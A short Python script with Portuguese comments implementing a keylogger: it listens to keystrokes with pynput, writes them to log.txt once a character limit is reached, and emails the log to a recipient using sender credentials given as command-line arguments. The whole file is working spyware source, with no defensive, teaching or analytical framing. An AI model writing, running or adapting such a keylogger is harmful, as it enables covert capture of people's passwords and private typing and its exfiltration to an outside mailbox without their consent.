import pynput
import smtplib
from mail import Mail
import sys
from pynput.keyboard import Key, Listener


keys = []
counter = 0
lim = int(sys.argv[1]) # Limite de caracteres a serem lidos
sender = sys.argv[2]   # Email remetente
receiver = sys.argv[3] # Email destinatário
pw = sys.argv[4]       # Senha email
email = Mail(sender, receiver, pw, "log.txt")


# Função para pressionamento da tecla
def on_press(key):
    global keys, counter
    keys.append(key)
    counter += 1

    if counter >= lim:
        write_keys(keys)


# Função quando solta a tecla
def on_release(key):
    if key == Key.esc:
        return False


# Escreve no arquivo e o envia por email
def write_keys(keys):
    with open("log.txt", "w") as file:
        for key in keys:
            if verify_key(key) == -1:
                print("[ERROR]")
            elif verify_key(key):
                file.write('\n')
            else:
                k = str(key).replace("'", "")
                file.write(k)
    email.send()
    sys.exit()


# Verifica tipo da tecla
def verify_key(key):
    a = str(key)
    if a.find('Key.') >= 0:
        x = a.split(".")
        if x[1] == "space":
            return True
        else:
            return -1
    else:
        return False


if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
